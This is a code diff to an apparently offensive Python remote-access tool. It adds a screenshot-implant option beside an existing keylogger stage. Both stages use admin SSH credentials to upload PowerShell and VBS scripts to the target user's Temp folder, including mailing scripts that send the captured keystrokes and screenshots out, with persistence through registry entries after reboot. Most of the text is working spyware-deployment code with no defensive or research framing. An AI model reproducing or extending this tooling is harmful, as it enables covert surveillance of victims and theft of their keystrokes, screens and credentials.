@@ -30,7 +30,8 @@ init_menu = """
     Options:
         [0] Remote access
         [1] Implant keylogger to target host
-        [2] Exit
+        [2] Implant screenshoting tool to target host
+        [3] Exit
 """
 
 alt_menu = """
@@ -46,14 +47,14 @@ alt_menu = """
     Options:
         [0] Remote access
         [1] Implant keylogger to target host
-        [2] Exit
+        [2] Implant screenshoting tool to target host
+        [3] Exit
 """
 
-menu_without_logo = """
+yes_no = """
     Options:
-        [0] Remote access
-        [1] Implant keylogger to target host
-        [2] Exit
+        [Y] Yup
+        [N] Nope
 """
 
 goodbye = """
@@ -78,6 +79,60 @@ key_stage_logo = """
 
 """
 
+
+scr_stage_logo = """
+
+    ░█▀▀░█▀▀░█▀▄░█▀▀░█▀▀░█▀█░█▀▀░█░█░█▀█░▀█▀░█▀▀
+    ░▀▀█░█░░░█▀▄░█▀▀░█▀▀░█░█░▀▀█░█▀█░█░█░░█░░▀▀█
+    ░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀░▀▀▀░░▀░░▀▀▀
+
+"""
+
+def scr_stage():
+    conf = cfg_func(sys.argv[1])
+
+    work_dir = conf.get("work_dir")
+    passw = conf.get("pass")
+    user = conf.get("admin_user")
+    addr = conf.get("addr")
+    target = conf.get("target")
+
+    # duh
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    relative_file_path = "tools/screen/scr.ps1"
+    file_to_transfer = os.path.join(script_dir, relative_file_path)
+    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\scr.ps1"
+
+    print("Uploading screenshoting script...")
+    file_upload(file_to_transfer, destination_path, passw, user, addr)
+
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    relative_file_path = "tools/screen/scr.vbs"
+    file_to_transfer = os.path.join(script_dir, relative_file_path)
+    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\scr.vbs"
+
+    print("Uploading VBS script for screenshoter...")
+    file_upload(file_to_transfer, destination_path, passw, user, addr)
+
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    relative_file_path = "tools/screen/scre.ps1"
+    file_to_transfer = os.path.join(script_dir, relative_file_path)
+    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\scre.ps1"
+
+    print("Uploading mailing script for screenshots...")
+    file_upload(file_to_transfer, destination_path, passw, user, addr)
+
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    relative_file_path = "tools/screen/scre.vbs"
+    file_to_transfer = os.path.join(script_dir, relative_file_path)
+    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\scre.vbs"
+
+    print("Uploading VBS script for screenshot mails...")
+    file_upload(file_to_transfer, destination_path, passw, user, addr)
+
+    print("Get some good shots")
+
+
 def key_stage():
     conf = cfg_func(sys.argv[1])
 
@@ -85,33 +140,66 @@ def key_stage():
     passw = conf.get("pass")
     user = conf.get("admin_user")
     addr = conf.get("addr")
+    target = conf.get("target")
 
-    client = paramiko.SSHClient()
+    # For keylog staging
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    relative_file_path = "tools/keylog/k.ps1"
+    file_to_transfer = os.path.join(script_dir, relative_file_path)
+    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\k.ps1"
+
+    print("Uploading keylogger...")
+    file_upload(file_to_transfer, destination_path, passw, user, addr)
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
-    relative_file_path = "tools/keylog/sksksk.txt"
+    relative_file_path = "tools/keylog/k.vbs"
     file_to_transfer = os.path.join(script_dir, relative_file_path)
-    destination_path = r"C:\Users\me\AppData\Local\Temp\lehRP\sksksk.txt"
+    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\k.vbs"
 
+    print("Uploading VBS script for keylogger...")
+    file_upload(file_to_transfer, destination_path, passw, user, addr)
+
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    relative_file_path = "tools/keylog/ke.ps1"
+    file_to_transfer = os.path.join(script_dir, relative_file_path)
+    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\ke.ps1"
+
+    print("Uploading mailing script for keylogger...")
+    file_upload(file_to_transfer, destination_path, passw, user, addr)
+
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    relative_file_path = "tools/keylog/ke.vbs"
+    file_to_transfer = os.path.join(script_dir, relative_file_path)
+    destination_path = fr"C:\Users\{target}\AppData\Local\Temp\{work_dir}\ke.vbs"
+
+    print("Uploading VBS script for keylogger mail...")
+    file_upload(file_to_transfer, destination_path, passw, user, addr)
+
+    print("Good to go")
+
+
+
+
+def file_upload(file_to_transfer, destination_path, passw, user, addr):
+
+    client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        # Connect to the server
+
         client.connect(addr, port=22, username=user, password=passw)
 
-        # Open an SFTP session
         sftp = client.open_sftp()
 
-        # Copy the file from the local host to the remote host
         sftp.put(file_to_transfer, destination_path)
 
-        # Close the SFTP session and SSH connection
         sftp.close()
         client.close()
 
         print("File transferred successfully.")
-    except Exception as e:
-        print(f"An error occurred: {e}")
 
+    except Exception as e:
+
+        print(f"An error occurred: {e}")
 
 
 def remote():
@@ -164,13 +252,14 @@ def cfg_func(cfg_file):
     conf["admin_user"] = f.readline().strip()
     conf["pass"] = f.readline().strip()
     conf["work_dir"] = f.readline().strip()
+    conf["target"] = cfg_file.rsplit('.cfg', 1)[0]
 
     return conf
 
 
 # for console
 def main():
-    '''
+
     #Check for arguments
     if arguments():
             if detect_os() == "linux":
@@ -180,22 +269,46 @@ def main():
                 prompt = int(input(f"Your choice: "))
 
                 # for options
-                while prompt != 2:
+                while prompt != 3:
                     if prompt == 0:
                         remote()
                         print(alt_menu)
                         prompt = int(input(f"Your choice: "))
 
                     if prompt == 1:
+                        os.system("clear")
                         print(key_stage_logo)
-                        print("Be advised: keylogger will be activateda after target reboot (due to registry entries). Still want to proceed?")
-                        print(menu_without_logo)
-                        pass
+                        print("Be advised: keylogger will be activated ONLY after target reboot (due to registry entries). Still want to proceed?")
+                        print(yes_no)
+                        char_ans = input(f"Your choice: ")
+                        if char_ans == 'Y':
+                            key_stage()
+                        if char_ans == 'N':
+                            print(alt_menu)
+                            prompt = int(input(f"Your choice: "))
+                            continue
+
                         print(alt_menu)
                         prompt = int(input(f"Your choice: "))
 
+                    if prompt == 2:
+                         os.system("clear")
+                         print(scr_stage_logo)
+                         print("Be advised: screenshot tool will start only after next target reboot, proceed?")
+                         print(yes_no)
+                         char_ans = input(f"Your choice: ")
+                         if char_ans == 'Y':
+                             scr_stage()
+                         if char_ans == 'N':
+                             print(alt_menu)
+                             prompt = int(input(f"Your choice: "))
+                             continue
+
+                         print(alt_menu)
+                         prompt = int(input(f"Your choice: "))
+
                     # handling wrong prompts
-                    elif prompt < 0 and prompt > 2:
+                    elif prompt < 0 and prompt > 3:
                             os.system("clear")
                             print(alt_menu)
                             prompt = int(input(f"Your choice: "))
@@ -214,8 +327,6 @@ def main():
 
 
             print(goodbye)
-            '''
-    key_stage()
 
 # If not imported
 if __name__ == '__main__':
